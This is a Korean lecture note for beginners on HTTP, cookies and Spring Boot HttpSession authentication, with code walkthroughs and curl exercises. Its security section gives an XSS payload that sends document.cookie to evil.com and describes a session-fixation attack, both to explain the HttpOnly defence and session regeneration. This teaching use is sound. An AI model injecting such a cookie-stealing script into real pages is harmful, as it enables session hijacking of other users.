---
type: 보조이론
track: auth
tags: [auth, theory, session]
---

# HTTP 프로토콜과 HttpSession — 보조 이론 강의

**과정명**: 강의용 Spring Boot 게시판 — HTTP & Session 이론 보강
**대상**: Spring Boot 입문 수강생 (HTTP를 처음 제대로 배우는 수준)
**선수 지식**: Java 기본 문법, IDE에서 Spring Boot 앱 실행 경험, 터미널에서 `curl` 사용 가능
**관련 코드**: `src/main/java/com/example/board/auth/AuthController.java`,
`src/main/java/com/example/board/auth/SessionConst.java`,
`src/main/java/com/example/board/post/PostController.java`,
`src/main/java/com/example/board/board/BoardController.java`

---

## 학습 목표

이 문서를 끝내면 수강생은:

- HTTP 요청/응답 메시지의 구조를 그려 설명할 수 있다 (이해)
- HTTP가 무상태(stateless)라는 것이 실제 코드에서 어떤 문제를 일으키는지 시나리오로 설명할 수 있다 (분석)
- Set-Cookie / Cookie 헤더가 어떻게 협력해 "기억하는 척"을 하는지 raw 메시지로 보일 수 있다 (이해)
- `HttpSession`이 서블릿 컨테이너에서 어떻게 실체화되는지 (메모리 Map + JSESSIONID 쿠키) 설명할 수 있다 (이해)
- 이 프로젝트의 `AuthController#login` / `PostController#create` 코드가 세션을 어떻게 활용하는지 한 줄씩 해설할 수 있다 (적용)
- 세션 vs 쿠키 vs JWT의 차이를 비교표로 정리할 수 있다 (분석)
- 세션 방식의 한계 (메모리, 다중 서버)와 보안 주의사항 (HttpOnly, session fixation, HTTPS)을 말할 수 있다 (이해)

---

## 1. HTTP 프로토콜 개요

### 1-1. HTTP는 "텍스트 기반 요청/응답 프로토콜"이다

웹은 결국 **클라이언트가 텍스트 한 덩어리를 보내고, 서버가 텍스트 한 덩어리로 답하는** 구조다.
브라우저 주소창의 `https://...`도, 우리가 만든 `curl http://localhost:8090/...`도 결국 아래와 같은 텍스트 메시지가 오간다.

```
┌─────────────┐      Request (텍스트)       ┌─────────────┐
│   Client    │ ───────────────────────────▶│   Server    │
│ (Browser/   │                              │ (Spring     │
│  curl)      │ ◀───────────────────────────│  Boot/8090) │
└─────────────┘      Response (텍스트)       └─────────────┘
```

### 1-2. HTTP 요청 메시지 구조

```
┌──────────────────────────────────────────────────────┐
│ Request line   : POST /api/v1/auth/login HTTP/1.1     │  ← 메서드 / 경로 / 버전
├──────────────────────────────────────────────────────┤
│ Headers        : Host: localhost:8090                 │
│                 Content-Type: application/json        │  ← key: value 의 모음
│                 Content-Length: 47                    │
├──────────────────────────────────────────────────────┤
│ (빈 줄)                                                │  ← 헤더 끝 표시
├──────────────────────────────────────────────────────┤
│ Body           : {"username":"alice","password":"..."}│  ← 선택. GET은 보통 없음
└──────────────────────────────────────────────────────┘
```

실제 이 프로젝트의 로그인 요청을 raw HTTP로 보면 이렇다:

```
POST /api/v1/auth/login HTTP/1.1
Host: localhost:8090
Content-Type: application/json
Content-Length: 47

{"username":"alice","password":"alice1234!"}
```

### 1-3. HTTP 응답 메시지 구조

```
┌──────────────────────────────────────────────────────┐
│ Status line    : HTTP/1.1 200 OK                      │  ← 버전 / 상태코드 / 상태문구
├──────────────────────────────────────────────────────┤
│ Headers        : Content-Type: application/json       │
│                 Set-Cookie: JSESSIONID=...; HttpOnly  │  ← 응답 헤더
│                 Content-Length: 65                    │
├──────────────────────────────────────────────────────┤
│ (빈 줄)                                                │
├──────────────────────────────────────────────────────┤
│ Body           : {"id":1,"username":"alice",...}      │
└──────────────────────────────────────────────────────┘
```

```
HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: JSESSIONID=8B6C2D9E4F1A...; Path=/; HttpOnly
Content-Length: 65

{"id":1,"username":"alice","email":"alice@example.com","role":"USER"}
```

### 1-4. 주요 메서드와 상태 코드 — 이 프로젝트 API 기준

| 메서드 | 의미 | 이 프로젝트 예시 |
|--------|------|------------------|
| `GET` | 조회 (멱등, 안전) | `GET /api/v1/boards`, `GET /api/v1/posts/{id}` |
| `POST` | 생성 / 비-멱등 동작 | `POST /api/v1/auth/login`, `POST /api/v1/boards/{boardId}/posts` |
| `PUT` | 전체 수정 (멱등) | `PUT /api/v1/posts/{id}` |
| `DELETE` | 삭제 (멱등) | `DELETE /api/v1/posts/{id}` |

| 상태 코드 | 의미 | 이 프로젝트에서 언제 나오나 |
|-----------|------|---------------------------|
| `200 OK` | 성공 (응답 본문 있음) | 로그인 성공, 글 조회 성공 |
| `201 Created` | 리소스 생성됨 | `signup`, 게시글/게시판 생성 (`@ResponseStatus(HttpStatus.CREATED)`) |
| `204 No Content` | 성공 (응답 본문 없음) | `logout`, 게시글 삭제 |
| `400 Bad Request` | 입력값 검증 실패 | `@Valid` 실패 — `ErrorCode.INVALID_INPUT` |
| `401 Unauthorized` | 인증 필요 / 자격 증명 실패 | `LOGIN_REQUIRED`, `LOGIN_FAILED` |
| `403 Forbidden` | 인증은 됐지만 권한 없음 | `POST_ACCESS_DENIED`, `ADMIN_ONLY` |
| `404 Not Found` | 리소스 없음 | `USER_NOT_FOUND`, `POST_NOT_FOUND`, `BOARD_NOT_FOUND` |
| `409 Conflict` | 충돌 (중복 등) | `DUPLICATE_USERNAME`, `DUPLICATE_EMAIL`, `NICKNAME_DUPLICATED` |
| `500 Internal Server Error` | 서버 내부 오류 | 예상치 못한 예외 — `INTERNAL_ERROR` |

> **포인트**
> - **401 vs 403** — 401은 "당신이 누군지 모르겠다(로그인하라)", 403은 "당신이 누군진 아는데 이건 못한다".
> - 우리 프로젝트의 `PostController#requireLogin`이 던지는 `UnauthorizedException`은 401로 응답된다. (`ErrorCode.LOGIN_REQUIRED`의 status가 `UNAUTHORIZED`)

### 1-5. 무상태(stateless) — HTTP의 본질적 특성

> **"HTTP 서버는 이전 요청을 기억하지 않는다."**

각 HTTP 요청은 완전히 독립적이다. 서버 입장에서 1초 전에 들어온 요청과 지금 들어온 요청을 자동으로 연결할 방법이 없다.

**구체 시나리오 — 무상태가 만드는 문제:**

```
[1초] Client ──▶ POST /api/v1/auth/login {"username":"alice", ...}
                Server: "OK, alice 로그인 성공"   ✓

[2초] Client ──▶ POST /api/v1/boards/1/posts {"title":"hello", ...}
                Server: "...누구세요? 방금 들어온 alice인지 다른 사람인지
                         나는 모릅니다. 두 요청을 연결할 정보가 없어요."
```

서버는 매 요청을 **처음 보는 사람**처럼 처리한다. 이게 HTTP가 stateless라는 말의 실체다.

이 문제를 푸는 가장 단순한 (그러나 최악의) 방법:

```http
# ❌ 매 요청마다 비밀번호 보내기 — 절대 안 됨
POST /api/v1/boards/1/posts HTTP/1.1
X-Username: alice
X-Password: alice1234!
```

- 네트워크 도청 시 매번 평문 비밀번호 노출
- 클라이언트가 비밀번호를 계속 보관해야 함
- 비밀번호 변경 시 모든 클라이언트가 깨짐

→ 그래서 **쿠키 + 세션** 메커니즘이 발명되었다.

### 1-6. 쿠키 메커니즘 — Set-Cookie / Cookie

서버는 응답에 `Set-Cookie` 헤더를 넣어 "이 값을 기억했다가 다음에 보내줘"라고 부탁한다.
브라우저(또는 `curl -b`)는 그 약속을 지켜 이후 요청마다 `Cookie` 헤더로 같은 값을 다시 보낸다.

```
[1차 응답]
HTTP/1.1 200 OK
Set-Cookie: JSESSIONID=8B6C2D9E4F1A; Path=/; HttpOnly

         ⬇  브라우저가 쿠키 저장소에 저장

[2차 요청 — 자동]
GET /api/v1/boards HTTP/1.1
Host: localhost:8090
Cookie: JSESSIONID=8B6C2D9E4F1A
```

쿠키는 그냥 **이름=값** 쌍을 주고받는 약속일 뿐이다. 거기에 무슨 의미가 있는지(세션 ID인지, 광고 추적용인지)는 전적으로 서버가 정한다.

### ✅ 확인 질문

> **Q1.** POST 요청과 GET 요청의 메시지 구조에서 가장 큰 차이는 무엇인가?
>
> **A1.** Body의 존재. POST는 보통 Body에 데이터를 담아 보내고, GET은 Body 없이 쿼리 파라미터(`?key=value`)로 데이터를 전달한다.

> **Q2.** 서버가 무상태라는 말은 정확히 무슨 뜻인가? 우리 프로젝트에서 무상태 그대로라면 어떤 문제가 생기는가?
>
> **A2.** 서버가 이전 요청을 자동으로 기억하지 않는다는 뜻이다. 그대로라면 `POST /auth/login`으로 로그인해도 직후 `POST /boards/1/posts` 요청에서 서버가 "누가 글을 쓰려는지" 알 방법이 없어 매번 비밀번호를 함께 보내야 한다.

---

## 2. HttpSession의 필요성과 개념, 역할

### 2-1. 핵심 아이디어 — "비밀번호 대신 식별표를 들고 다닌다"

쿠키만으로 매번 비밀번호를 보내는 건 위험하다. 그래서 다음과 같이 약속을 바꾼다:

1. 로그인 시 서버는 사용자 정보를 **서버 메모리**에 저장한다.
2. 저장소에 접근할 수 있는 **임의의 키(세션 ID)** 를 발급한다.
3. 이 키만 쿠키(`JSESSIONID`)로 클라이언트에게 준다.
4. 이후 클라이언트는 이 키만 보내면 된다. 서버는 키로 저장소를 뒤져 사용자를 식별한다.

> **세션 = 서버 측 저장소**
> **JSESSIONID 쿠키 = 그 저장소를 가리키는 열쇠**
> 비밀번호는 단 한 번, 로그인 때만 전송된다.

### 2-2. 전체 흐름 다이어그램

```
                                     ┌──────────────────────┐
                                     │   Server (Tomcat)    │
                                     │  ┌────────────────┐  │
                                     │  │ Session Store  │  │
                                     │  │ (메모리 Map)   │  │
                                     │  └────────────────┘  │
                                     └──────────────────────┘

Client                                            Server
  │                                                  │
  │  ① POST /auth/login {alice, pw}                  │
  ├─────────────────────────────────────────────────▶│
  │                                                  │  ② AuthService.login() 검증
  │                                                  │  ③ session.setAttribute(
  │                                                  │       "loginUserId", 1L)
  │                                                  │  ④ Session Store에 저장:
  │                                                  │     { "8B6C..." → { userId:1 } }
  │                                                  │
  │  ⑤ 200 OK                                        │
  │     Set-Cookie: JSESSIONID=8B6C...; HttpOnly     │
  │◀─────────────────────────────────────────────────┤
  │                                                  │
  │ (브라우저가 쿠키 저장)                            │
  │                                                  │
  │  ⑥ POST /boards/1/posts {title, content}         │
  │     Cookie: JSESSIONID=8B6C...                   │
  ├─────────────────────────────────────────────────▶│
  │                                                  │  ⑦ JSESSIONID로 Session 조회
  │                                                  │  ⑧ @SessionAttribute로
  │                                                  │     loginUserId = 1L 주입
  │                                                  │  ⑨ postService.create(...)
  │                                                  │
  │  ⑩ 201 Created                                   │
  │◀─────────────────────────────────────────────────┤
```

### 2-3. 세션의 역할

| 역할 | 설명 | 이 프로젝트 예 |
|------|------|----------------|
| 인증 상태 유지 | "이 클라이언트는 로그인된 alice" 같은 사실을 기억 | `session.setAttribute(SessionConst.LOGIN_USER_ID, user.id())` |
| 사용자별 임시 데이터 보관 | 장바구니, 진행 중인 폼, 최근 본 글 등 | (이 프로젝트는 사용하지 않음 — 단계 1은 인증만) |
| 로그아웃 | 서버 측 상태를 지워 즉시 무효화 | `session.invalidate()` |

### 2-4. 세션 vs 쿠키 vs JWT 비교

| 항목 | Cookie (값만 사용) | HttpSession | JWT (토큰) |
|------|-------------------|-------------|------------|
| 상태 보관 위치 | 클라이언트 | **서버 메모리/DB** | 클라이언트 (토큰 자체에 정보 포함) |
| 서버 상태 | stateless | **stateful** | stateless |
| 쿠키 사용? | 그 자체 | JSESSIONID 쿠키로 식별 | 보통 `Authorization: Bearer ...` 헤더 |
| 위변조 방지 | 별도 서명 필요 | 서버가 보관하므로 클라이언트가 바꿔도 무의미 | 서명(Signature)으로 보장 |
| 다중 서버 확장 | 영향 없음 | **세션 공유 필요** (Redis 등) | 영향 없음 |
| 만료 관리 | 쿠키 만료 | `setMaxInactiveInterval`, `invalidate()` | 토큰의 `exp` claim |
| 로그아웃 즉시 무효화 | 어려움 | **쉬움** (`invalidate()`) | 어려움 (블랙리스트 필요) |
| 이 프로젝트 단계 | — | **단계 1 (현재)** | 단계 2 (예정) |

> **포인트**
> - 세션은 "**서버가 기억한다**"는 강력함 대신 **확장성**을 양보한다.
> - JWT는 "**서버가 기억할 필요 없다**"는 확장성 대신 **즉시 무효화**의 편의성을 양보한다.
> - 정답은 없다. 트래픽, 보안 요구, 인프라에 따라 선택한다.

### 2-5. 세션 생명주기

```
┌─────────────────┐    최초 getSession()    ┌─────────────────┐
│   (세션 없음)   │ ──────────────────────▶│     생성됨      │
└─────────────────┘                          │  (Set-Cookie    │
                                             │   JSESSIONID)   │
                                             └────────┬────────┘
                                                      │
                                ┌─────────────────────┴─────────┐
                                │                                │
                                ▼                                ▼
                       30분 동안 요청 없음              session.invalidate()
                  (server.servlet.session.timeout)      (예: logout)
                                │                                │
                                └────────────┬───────────────────┘
                                             ▼
                                  ┌─────────────────┐
                                  │     소멸됨      │
                                  │ (Map에서 제거)  │
                                  └─────────────────┘
```

- **기본 타임아웃**: 30분 (`server.servlet.session.timeout=30m`). 이 프로젝트는 별도 설정이 없으므로 기본값을 따른다.
- **타임아웃 갱신**: 매 요청마다 "마지막 접근 시각"이 갱신된다 → 활동 중인 사용자는 만료되지 않는다.
- **수동 만료**: `session.invalidate()` — 우리 프로젝트의 `logout()`이 이 방식이다.

### ✅ 확인 질문

> **Q1.** 비밀번호를 매 요청에 보내는 대신 세션을 쓰는 가장 큰 이유는?
>
> **A1.** 비밀번호는 단 한 번(로그인 시점)만 전송하고, 이후에는 **임의로 만든 식별 키(JSESSIONID)** 만 주고받기 때문에 비밀번호가 네트워크에 반복 노출되지 않는다. 또한 서버는 `invalidate()`로 즉시 인증을 끊을 수 있다.

> **Q2.** 서버를 2대로 늘렸을 때 세션 기반 인증이 문제가 되는 이유는?
>
> **A2.** 세션은 서버 메모리에 있어, 1번 서버에서 로그인한 사용자가 2번 서버로 라우팅되면 세션을 찾을 수 없다. 그래서 Redis 같은 외부 세션 저장소나 sticky session, 혹은 stateless한 JWT가 필요해진다.

---

## 3. 개념과 실체 — 코드로서의 Session 객체

### 3-1. 추상 개념이 실제로 어떻게 존재하는가

"세션"은 추상 개념이지만, 실행 중인 서버에서는 **실제로 메모리 어딘가에 객체로 존재**한다.

```
Spring Boot 앱 = 내장 Tomcat이 돌고 있는 JVM 프로세스

Tomcat 내부:
┌─────────────────────────────────────────────────┐
│   StandardSessionManager (Tomcat 내부 구현)     │
│   ┌───────────────────────────────────────────┐ │
│   │  ConcurrentHashMap<String, Session>       │ │
│   │                                            │ │
│   │  "8B6C2D9E..." ─▶ StandardSession         │ │
│   │                    ├─ attributes: Map     │ │
│   │                    │  └─ "loginUserId":1L │ │
│   │                    ├─ creationTime        │ │
│   │                    └─ lastAccessedTime    │ │
│   │                                            │ │
│   │  "F3A1...."    ─▶ StandardSession (bob)   │ │
│   └───────────────────────────────────────────┘ │
└─────────────────────────────────────────────────┘
                       ▲
                       │  Servlet API
                       │
              jakarta.servlet.http.HttpSession  (인터페이스)
                       │
                       │  Spring이 컨트롤러 파라미터에 주입
                       ▼
              @PostMapping("/login")
              public ... login(..., HttpSession session)
```

- **`HttpSession`** 은 **인터페이스**다 (`jakarta.servlet.http.HttpSession`). 우리 코드는 이 인터페이스만 알면 된다.
- 실제 구현체는 톰캣의 `StandardSession`이고, 매니저는 `ConcurrentHashMap`처럼 동작하는 Map에 세션을 저장한다.
- **JSESSIONID 쿠키는 언제 발급되나?** 컨트롤러에서 처음 `getSession()`을 호출하거나 `HttpSession`을 파라미터로 받아 **읽거나 쓰는 순간** Tomcat이 새 세션을 만들고 응답에 `Set-Cookie: JSESSIONID=...`를 자동으로 추가한다.

### 3-2. 이 프로젝트의 실제 코드 — AuthController

`src/main/java/com/example/board/auth/AuthController.java`:

```java
@PostMapping("/login")
public UserResponse login(@Valid @RequestBody LoginRequest request, HttpSession session) {
  UserResponse user = authService.login(request);
  session.setAttribute(SessionConst.LOGIN_USER_ID, user.id());
  return user;
}
```

한 줄씩 읽어보자.

| 라인 | 의미 |
|------|------|
| `HttpSession session` | Spring이 현재 요청에 연결된 세션을 자동 주입. **없으면 새로 만든다.** 이 시점에 응답에 `Set-Cookie: JSESSIONID=...`가 자동 포함될 준비가 된다. |
| `authService.login(request)` | username/password 검증. 실패 시 `UnauthorizedException` (→ 401). |
| `session.setAttribute(SessionConst.LOGIN_USER_ID, user.id())` | 세션 저장소(Map)에 `("loginUserId" → 1L)` 형태로 보관. 클라이언트로는 전송되지 않고 **서버 메모리에만** 남는다. |
| `return user` | 응답 Body에는 `UserResponse`만. **userId는 절대 응답에 인증 토큰처럼 쓰지 않는다.** 식별은 JSESSIONID 쿠키가 담당. |

로그아웃은 어떻게 되어 있나:

```java
@PostMapping("/logout")
@ResponseStatus(HttpStatus.NO_CONTENT)
public void logout(HttpServletRequest request) {
  HttpSession session = request.getSession(false);
  if (session != null) {
    session.invalidate();
  }
}
```

| 라인 | 의미 |
|------|------|
| `request.getSession(false)` | **`false`가 핵심.** "있으면 가져오고, 없으면 새로 만들지 마라." 만약 `true`(또는 인자 없이)로 호출하면 로그아웃 요청 자체가 새 세션을 만드는 모순이 생긴다. |
| `session.invalidate()` | 서버 측 세션 저장소에서 이 세션을 제거. 이후 클라이언트가 같은 JSESSIONID를 보내도 "그런 세션 없습니다" 상태가 된다. |
| `@ResponseStatus(HttpStatus.NO_CONTENT)` | 204 응답. 응답 Body가 없다. |

### 3-3. attribute 키 상수화 — SessionConst

`src/main/java/com/example/board/auth/SessionConst.java`:

```java
public final class SessionConst {

  public static final String LOGIN_USER_ID = "loginUserId";

  private SessionConst() {
  }
}
```

> **왜 상수로 빼는가?**
>
> ```java
> // ❌ 나쁜 예 — 문자열 흩뿌리기
> session.setAttribute("loginUserId", user.id());     // AuthController
> session.getAttribute("loginuserid");                 // 어딘가의 다른 컨트롤러 (오타!)
> ```
>
> 컴파일러는 오타를 잡아주지 못한다. 런타임에 `null`이 돌아와서 "로그인이 풀렸다"는 미스터리 버그가 된다.
> `SessionConst.LOGIN_USER_ID`로 통일하면 IDE 자동완성 + 컴파일 단계 안전성을 확보한다.

> `final class` + `private` 생성자: 인스턴스 생성/상속을 막아 "상수 보관소" 역할만 하도록 강제한다.

### 3-4. 꺼내 쓰는 쪽 — PostController

`src/main/java/com/example/board/post/PostController.java`:

```java
@PostMapping("/boards/{boardId}/posts")
@ResponseStatus(HttpStatus.CREATED)
public PostResponse create(
    @PathVariable Long boardId,
    @SessionAttribute(name = SessionConst.LOGIN_USER_ID, required = false) Long loginUserId,
    @Valid @RequestBody PostCreateRequest request) {
  return postService.create(boardId, requireLogin(loginUserId), request);
}

private Long requireLogin(Long loginUserId) {
  if (loginUserId == null) {
    throw new UnauthorizedException(ErrorCode.LOGIN_REQUIRED);
  }
  return loginUserId;
}
```

| 라인 | 의미 |
|------|------|
| `@SessionAttribute(name = SessionConst.LOGIN_USER_ID, required = false)` | 현재 세션에서 `"loginUserId"` 속성을 꺼내 파라미터에 바인딩. **`required = false`** 이므로 세션이 없거나 속성이 없으면 `null`이 들어온다. |
| `Long loginUserId` | 세션에 저장할 때 `user.id()` (타입 `Long`) 였기 때문에 꺼낼 때도 `Long`. 타입이 안 맞으면 ClassCastException. |
| `requireLogin(loginUserId)` | `null`이면 401(`LOGIN_REQUIRED`)로 끝낸다. 모든 인증 필요 컨트롤러에 동일한 가드를 두는 일관된 패턴. |

> **왜 `required = false`로 받고 직접 검사하나?**
> - `required = true`로 두면 세션 속성이 없을 때 Spring이 던지는 예외는 우리가 원하는 401이 아니라 다른 형태로 매핑된다.
> - 우리는 명확히 `ErrorCode.LOGIN_REQUIRED` (401) 로 응답하고 싶으므로 `false`로 받아 직접 `UnauthorizedException`을 던진다.
> - 이 패턴은 `BoardController`에도 동일하게 적용되어 있다.

### 3-5. HttpSession 주요 API

| API | 시그니처 | 용도 |
|-----|---------|------|
| `getSession()` / `getSession(true)` | `HttpSession getSession()` | 세션이 없으면 **새로 만든다**. (이때 JSESSIONID 발급) |
| `getSession(false)` | `HttpSession getSession(boolean)` | 세션이 있으면 가져오고, 없으면 `null`. **새로 만들지 않음.** |
| `setAttribute(name, value)` | `void setAttribute(String, Object)` | 세션 저장소에 데이터 보관. 값은 Serializable 권장. |
| `getAttribute(name)` | `Object getAttribute(String)` | 보관된 데이터 조회. 반환 타입은 `Object` — 캐스팅 필요. |
| `removeAttribute(name)` | `void removeAttribute(String)` | 특정 속성만 제거 (세션 자체는 살아있음). |
| `invalidate()` | `void invalidate()` | 세션 전체를 무효화. 로그아웃의 표준 구현. |
| `setMaxInactiveInterval(sec)` | `void setMaxInactiveInterval(int)` | 비활성 타임아웃을 **초 단위**로 설정 (음수면 무한). |
| `getId()` | `String getId()` | 세션 ID 문자열. 디버깅 로그에 종종 사용. |

### 3-6. 헷갈리는 3가지 — `@SessionAttribute` / `HttpSession` / `@SessionAttributes`

| 방식 | 어떻게 쓰나 | 언제 쓰나 |
|------|-------------|-----------|
| `@SessionAttribute(name="...")` | **컨트롤러 파라미터에** 어노테이션. Spring이 세션에서 꺼내 주입 | **이미 세션에 저장돼 있는 값을 읽을 때.** 이 프로젝트의 `PostController`, `BoardController`가 사용 |
| `HttpSession session` 직접 주입 | 컨트롤러 파라미터에 `HttpSession` 타입 선언 | **세션에 값을 저장**하거나 `invalidate()`처럼 제어가 필요할 때. 이 프로젝트의 `AuthController#login` |
| `@SessionAttributes("xxx")` (s 주의!) | **클래스 레벨**에 선언. `@ModelAttribute`와 연동되어 모델 객체를 세션에 자동 저장 | 전통적 SSR(JSP/Thymeleaf) 폼 처리에서 폼 객체를 여러 요청에 걸쳐 유지할 때. **REST API에선 거의 안 쓴다.** |

> **흔한 혼동**
> - `@SessionAttribute` (단수, 파라미터용) ≠ `@SessionAttributes` (복수, 클래스용)
> - 이름이 한 글자 차이라 자동완성에서 실수 잦음. 우리 프로젝트는 단수형만 쓴다.

### ✅ 확인 질문

> **Q1.** `request.getSession(true)`와 `request.getSession(false)`의 차이는? `logout()`이 `false`를 쓰는 이유는?
>
> **A1.** `true`(기본값)는 세션이 없으면 새로 만들고, `false`는 없으면 `null`을 반환한다. 로그아웃에서 `true`를 쓰면 "로그아웃" 요청이 도리어 새 세션을 만들고 JSESSIONID 쿠키를 발급해 버리는 모순이 생긴다.

> **Q2.** `PostController#create`의 `@SessionAttribute(... required = false)`에서 `required = false`를 굳이 쓰는 이유는?
>
> **A2.** 로그인 안 한 사용자가 호출했을 때 우리가 정의한 `ErrorCode.LOGIN_REQUIRED`(401)로 일관되게 응답하기 위해서다. `required = true`로 두면 Spring이 던지는 기본 예외에 흐름이 끌려가게 된다.

---

## 4. 구현 정리 + 실습

### 4-1. 로그인 → 글 작성 전체 시퀀스 (이 프로젝트 코드 기준)

```
Client                  AuthController        AuthService         PostController         PostService
  │                          │                     │                    │                     │
  │ POST /api/v1/auth/login  │                     │                    │                     │
  │ {username, password}     │                     │                    │                     │
  ├─────────────────────────▶│                     │                    │                     │
  │                          │ login(request)      │                    │                     │
  │                          ├────────────────────▶│                    │                     │
  │                          │                     │ findByUsername     │                     │
  │                          │                     │ + passwordEncoder  │                     │
  │                          │                     │   .matches(...)    │                     │
  │                          │  UserResponse       │                    │                     │
  │                          │◀────────────────────┤                    │                     │
  │                          │                                          │                     │
  │                          │ session.setAttribute(                    │                     │
  │                          │   "loginUserId", user.id())              │                     │
  │                          │                                          │                     │
  │ 200 OK                   │                                          │                     │
  │ Set-Cookie:              │                                          │                     │
  │   JSESSIONID=8B6C...     │                                          │                     │
  │◀─────────────────────────┤                                          │                     │
  │                                                                     │                     │
  │ POST /api/v1/boards/1/posts                                         │                     │
  │ Cookie: JSESSIONID=8B6C...                                          │                     │
  │ {title, content}                                                    │                     │
  ├────────────────────────────────────────────────────────────────────▶│                     │
  │                                                                     │                     │
  │                                              [Spring: JSESSIONID 으로 세션 조회]            │
  │                                              [@SessionAttribute 으로 loginUserId 주입]      │
  │                                                                     │                     │
  │                                                                     │ requireLogin(...)   │
  │                                                                     │   → null이면 401    │
  │                                                                     │ create(boardId,     │
  │                                                                     │   userId, request)  │
  │                                                                     ├────────────────────▶│
  │                                                                     │                     │ save
  │                                                                     │  PostResponse       │
  │                                                                     │◀────────────────────┤
  │ 201 Created {id, title, ...}                                        │                     │
  │◀────────────────────────────────────────────────────────────────────┤                     │
```

### 4-2. curl 실습 — 쿠키를 눈으로 확인

> 앱은 8090 포트에서 동작한다 (`application.yaml`의 `server.port: 8090`).
> 실습 전 `./gradlew bootRun`으로 앱을 띄워두자.

**실습 1. 회원가입 (사전 준비)**

```bash
curl -i -X POST http://localhost:8090/api/v1/auth/signup \
  -H "Content-Type: application/json" \
  -d '{
    "username":"alice",
    "email":"alice@example.com",
    "password":"Alice1234!",
    "nickname":"엘리스"
  }'
```

기대 응답: `HTTP/1.1 201`, Body에 `{"id":1,"username":"alice",...}`.

**실습 2. 로그인 — `-c cookies.txt`로 쿠키 저장**

```bash
curl -i -X POST http://localhost:8090/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -c cookies.txt \
  -d '{"username":"alice","password":"Alice1234!"}'
```

응답 헤더에서 다음 줄을 직접 확인하라:

```
Set-Cookie: JSESSIONID=...; Path=/; HttpOnly
```

그리고 `cookies.txt`를 열어보면:

```
# Netscape HTTP Cookie File
localhost  FALSE  /  FALSE  0  JSESSIONID  8B6C2D9E4F1A...
```

**실습 3. 글 작성 — `-b cookies.txt`로 쿠키 전송**

먼저 게시판이 있어야 한다. 데이터가 비어있다면 `DataInitializer`가 만들어주거나, ADMIN 계정으로 게시판을 생성해야 한다. 여기서는 boardId=1이 있다고 가정한다.

```bash
curl -i -X POST http://localhost:8090/api/v1/boards/1/posts \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"title":"hello","content":"my first post"}'
```

기대 응답: `HTTP/1.1 201 Created`.

**실습 4. 쿠키 없이 같은 요청 — 401 확인**

```bash
curl -i -X POST http://localhost:8090/api/v1/boards/1/posts \
  -H "Content-Type: application/json" \
  -d '{"title":"no cookie","content":"should fail"}'
```

기대 응답:

```
HTTP/1.1 401
Content-Type: application/json
...
{"code":"LOGIN_REQUIRED","message":"로그인이 필요합니다."}
```

**실습 5. 로그아웃 후 같은 쿠키 재사용 — 다시 401**

```bash
# 로그아웃
curl -i -X POST http://localhost:8090/api/v1/auth/logout -b cookies.txt
# → 204 No Content

# 같은 쿠키로 다시 글 작성 시도
curl -i -X POST http://localhost:8090/api/v1/boards/1/posts \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"title":"after logout","content":"..."}'
# → 401 LOGIN_REQUIRED
```

같은 JSESSIONID 값을 보내도 서버 측 세션이 `invalidate()`되어 더 이상 매칭되지 않는다는 점을 직접 확인할 수 있다.

### 4-3. 세션 방식의 한계 → 단계 2 예고

| 한계 | 설명 |
|------|------|
| **메모리 사용** | 동시 접속자가 많을수록 Tomcat JVM 메모리에 세션 객체가 쌓인다. 1만 명 동시 접속이면 1만 개의 세션 객체. |
| **다중 서버 확장** | 서버 A에서 로그인 → 로드밸런서가 서버 B로 보냄 → 서버 B는 그 세션을 모름. 해결: Redis 세션 저장소, sticky session, 또는 stateless 인증. |
| **재시작 시 휘발** | Tomcat 메모리가 기본 저장소이므로 앱 재배포 시 모든 사용자가 로그아웃된다 (외부 저장소를 쓰지 않는 한). |
| **CSRF 표면** | 쿠키는 브라우저가 자동 동봉하므로 CSRF 공격 표면이 생긴다. (이 프로젝트는 강의 단계 1 단순화를 위해 `csrf.disable` 상태) |

> **다음 단계 예고 — JWT (단계 2)**
>
> 지금은 "로그인 상태"를 서버가 직접 기억한다.
> 다음 단계에선 서버가 아무것도 기억하지 않고, 서명된 토큰 자체가 "나는 alice이고 만료는 1시간 뒤다"라는 정보를 들고 다니는 **stateless** 방식을 배운다.
> 그때는 서버를 100대로 늘려도 세션 동기화 고민이 없다. 대신 **토큰 즉시 무효화**가 어려워진다 — 무엇을 양보할지의 선택이다.

### 4-4. 보안 주의사항

#### (a) HttpOnly 쿠키 — XSS 방어

`Set-Cookie: JSESSIONID=...; HttpOnly` 의 `HttpOnly` 플래그는 **JavaScript에서 `document.cookie`로 읽지 못하게** 한다.

```
[ XSS 공격 시나리오 ]
공격자가 게시글에 <script>fetch('https://evil.com?c='+document.cookie)</script> 주입
   │
   ▼
다른 사용자가 그 글을 봄
   │
   ▼
HttpOnly가 없으면: document.cookie에 JSESSIONID 노출 → 공격자가 탈취 → 세션 하이재킹
HttpOnly가 있으면: document.cookie에서 JSESSIONID가 안 보임 → 탈취 실패
```

Spring Boot 내장 Tomcat은 **JSESSIONID에 기본적으로 HttpOnly를 붙여준다.** 우리는 별도 설정 없이 보호받는다.

#### (b) 세션 고정 공격 (Session Fixation) — 로그인 시 세션 재생성

```
[ 공격 시나리오 ]
1) 공격자가 먼저 서버에서 JSESSIONID=ATTACK을 발급받음
2) 피해자에게 이 ID를 강제로 심음 (특수 링크, XSS 등)
3) 피해자가 그 세션 ID로 로그인 → 서버가 그 세션에 "loginUserId" 저장
4) 공격자는 자기가 갖고 있던 JSESSIONID=ATTACK으로 피해자 행세
```

**방어**: 로그인 성공 직후 **세션 ID를 새로 발급**한다.

```java
// 직접 작성한다면 (이 프로젝트는 단계 1 단순화를 위해 미구현)
@PostMapping("/login")
public UserResponse login(LoginRequest request, HttpServletRequest req) {
  UserResponse user = authService.login(request);
  HttpSession old = req.getSession(false);
  if (old != null) old.invalidate();
  HttpSession fresh = req.getSession(true);   // 새 ID 발급
  fresh.setAttribute(SessionConst.LOGIN_USER_ID, user.id());
  return user;
}
```

Spring Security를 도입하면 이 처리가 기본으로 활성화된다 (`sessionManagement().sessionFixation().migrateSession()`). 우리 프로젝트는 단계 1에서는 Security 필터를 모두 비활성화했지만(`SecurityConfig` 참고), 단계 2에서 다시 켜며 이 보호를 자연스럽게 얻게 된다.

#### (c) HTTPS는 선택이 아닌 필수

- HTTP 평문 통신이면 와이파이 도청자가 `Cookie: JSESSIONID=8B6C...` 를 그대로 읽을 수 있다.
